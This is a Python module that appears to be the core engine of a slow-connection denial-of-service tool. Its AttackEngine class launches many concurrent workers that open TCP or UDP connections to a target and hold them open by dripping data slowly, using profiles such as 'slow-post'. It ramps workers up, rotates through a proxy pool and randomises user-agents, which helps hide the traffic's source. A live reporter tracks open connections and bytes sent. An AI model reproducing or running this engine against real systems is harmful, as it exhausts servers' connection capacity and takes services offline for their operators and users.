"""Asynchronous attack engine and live statistics."""

from __future__ import annotations

import asyncio
import json
import random
import ssl
import sys
import time

from . import conn, udp
from .config import Config
from .profiles import PROFILES
from .proxies import ProxyPool
from .stats import Stats, human_size


class AttackEngine:
    """Spawns ``concurrency`` workers that slowly consume connections."""

    def __init__(self, config: Config, stop: asyncio.Event):
        self.config = config
        self.stop = stop
        self.stats = Stats()
        self._pool = ProxyPool(config.proxies, config.rotate_proxies) if config.proxies else None
        self._circuit_breaker_triggered = False
        # Cache profile instance (profiles are stateless; UDP does not use the
        # reader/writer profile machinery, so fall back to a harmless default).
        self._profile = PROFILES[config.mode]() if config.mode != "udp" else PROFILES["slow-post"]()

    async def run(self) -> None:
        # Stagger worker starts if ramp-up is enabled
        workers = []
        if self.config.ramp_up > 0:
            # Start workers gradually: ramp_up workers per second
            delay = 1.0 / self.config.ramp_up
            for i in range(self.config.concurrency):
                if self.stop.is_set():
                    break
                workers.append(asyncio.create_task(self._worker(i)))
                if i < self.config.concurrency - 1:  # Don't delay after last worker
                    await asyncio.sleep(delay)
        else:
            # Start all workers immediately
            workers = [asyncio.create_task(self._worker(i)) for i in range(self.config.concurrency)]

        reporter = asyncio.create_task(self._report())
        try:
            if self.config.duration > 0:
                try:
                    await asyncio.wait_for(self.stop.wait(), timeout=self.config.duration)
                except TimeoutError:
                    pass  # time's up
            else:
                await self.stop.wait()
        finally:
            self.stop.set()

        # Give workers a grace period to observe the stop flag, then cancel.
        await asyncio.wait(workers, timeout=2.0)
        for task in workers:
            if not task.done():
                task.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

        reporter.cancel()
        await asyncio.gather(reporter, return_exceptions=True)

        # If circuit breaker was triggered, set a flag for main() to check
        if self._circuit_breaker_triggered:
            self.stats.circuit_breaker = True

    async def _worker(self, idx: int) -> None:
        # UDP mode uses a datagram transport (no reader/writer streams).
        if self.config.mode == "udp":
            await self._udp_worker(idx)
            return
        config = self.config
        consecutive_errors = 0
        backoff_time = 0.3  # Initial backoff

        while not self.stop.is_set():
            # Circuit breaker: exit if max consecutive errors reached
            if config.max_errors > 0 and consecutive_errors >= config.max_errors:
                if config.verbose:
                    print(
                        f"  [w{idx}] Circuit breaker: {consecutive_errors} consecutive errors, exiting",
                        flush=True,
                    )
                self._circuit_breaker_triggered = True
                self.stop.set()  # Signal all workers to stop
                return

            proxy = self._pool.next() if self._pool else None
            if self._pool is not None and proxy is None:
                await asyncio.sleep(1.0)
                continue
            ua = random.choice(config.user_agents) if config.user_agents else "Mozilla/5.0"
            writer = None
            try:
                reader, writer = await conn.open_connection(
                    config.host, config.port, config=config, proxy=proxy
                )
                self.stats.connections += 1
                self.stats.active += 1
                self.stats.peak_active = max(self.stats.peak_active, self.stats.active)
                consecutive_errors = 0  # Reset on success
                backoff_time = 0.3  # Reset backoff on success

                # Record proxy success
                if proxy and self._pool:
                    self._pool.record_success(proxy)

                completed = await self._profile.run(
                    reader, writer, config, ua, self.stats, self.stop
                )
                if completed:
                    self.stats.completed += 1
            except asyncio.CancelledError:
                raise
            except (TimeoutError, ConnectionError, OSError, ssl.SSLError) as exc:
                self.stats.errors += 1
                consecutive_errors += 1
                if config.verbose:
                    print(
                        f"  [w{idx}] {type(exc).__name__}: {exc} (consecutive: {consecutive_errors})",
                        flush=True,
                    )

                # Deprioritize the proxy (don't remove it); recovery is handled
                # by the proxy's cooldown window.
                if proxy and self._pool:
                    self._pool.record_failure(proxy)

                # Exponential backoff with jitter, capped at 30 seconds
                backoff_time = min(backoff_time * 2, 30.0)
                jitter = random.uniform(0.1, 0.3) * backoff_time
                await asyncio.sleep(backoff_time + jitter)
            finally:
                if writer is not None:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except OSError:
                        pass
                    self.stats.active = max(0, self.stats.active - 1)

    async def _udp_worker(self, idx: int) -> None:
        """UDP mode worker: repeatedly open a datagram socket and slowly drip.

        Mirrors ``_worker``'s lifetime/stats/backoff handling but replaces the
        TCP stream with a real connected UDP socket so the datagram traffic is
        genuinely sent over the network.
        """
        config = self.config
        consecutive_errors = 0
        backoff_time = 0.3
        transport = None
        while not self.stop.is_set():
            if config.max_errors > 0 and consecutive_errors >= config.max_errors:
                if config.verbose:
                    print(
                        f"  [w{idx}] Circuit breaker: {consecutive_errors} consecutive errors, exiting",
                        flush=True,
                    )
                self._circuit_breaker_triggered = True
                self.stop.set()
                return

            try:
                transport, _ = await udp.open_datagram(
                    config.host,
                    config.port,
                    connect_timeout=config.connect_timeout,
                    stats=self.stats,
                )
                self.stats.connections += 1
                self.stats.active += 1
                self.stats.peak_active = max(self.stats.peak_active, self.stats.active)
                consecutive_errors = 0
                backoff_time = 0.3

                completed = await udp.drip(transport, config, self.stats, self.stop)
                if completed:
                    self.stats.completed += 1
            except asyncio.CancelledError:
                raise
            except (TimeoutError, ConnectionError, OSError) as exc:
                self.stats.errors += 1
                consecutive_errors += 1
                if config.verbose:
                    print(
                        f"  [w{idx}] {type(exc).__name__}: {exc} (consecutive: {consecutive_errors})",
                        flush=True,
                    )
                backoff_time = min(backoff_time * 2, 30.0)
                jitter = random.uniform(0.1, 0.3) * backoff_time
                await asyncio.sleep(backoff_time + jitter)
            finally:
                if transport is not None:
                    try:
                        transport.close()
                    except OSError:
                        pass
                    self.stats.active = max(0, self.stats.active - 1)
                    transport = None

    async def _report(self) -> None:
        config = self.config
        stats = self.stats
        last_time = time.monotonic()
        last_sent = 0
        last_recv = 0
        try:
            while True:
                await asyncio.sleep(config.stats_interval)
                now = time.monotonic()
                dt = now - last_time or 1e-9
                sent_rate = (stats.bytes_sent - last_sent) / dt
                recv_rate = (stats.bytes_received - last_recv) / dt
                last_time, last_sent, last_recv = now, stats.bytes_sent, stats.bytes_received
                uptime = now - stats.start

                payload = {
                    "connections": stats.connections,
                    "active": stats.active,
                    "peak_active": stats.peak_active,
                    "completed": stats.completed,
                    "errors": stats.errors,
                    "bytes_sent": stats.bytes_sent,
                    "bytes_received": stats.bytes_received,
                    "sent_bytes_per_sec": round(sent_rate, 1),
                    "recv_bytes_per_sec": round(recv_rate, 1),
                    "uptime": round(uptime, 1),
                }

                if config.json_output:
                    print(json.dumps(payload), flush=True)
                elif not config.quiet:
                    line = (
                        f"\rthm | conns={stats.connections} open={stats.active} "
                        f"done={stats.completed} err={stats.errors} | "
                        f"sent {human_size(stats.bytes_sent)} "
                        f"@{human_size(sent_rate)}/s | "
                        f"recv {human_size(stats.bytes_received)} "
                        f"@{human_size(recv_rate)}/s | "
                        f"{int(uptime // 60)}:{int(uptime % 60):02d}"
                    )
                    sys.stdout.write(line.ljust(130))
                    sys.stdout.flush()
        except asyncio.CancelledError:
            pass
        finally:
            if not config.json_output and not config.quiet:
                sys.stdout.write("\n")
                sys.stdout.flush()
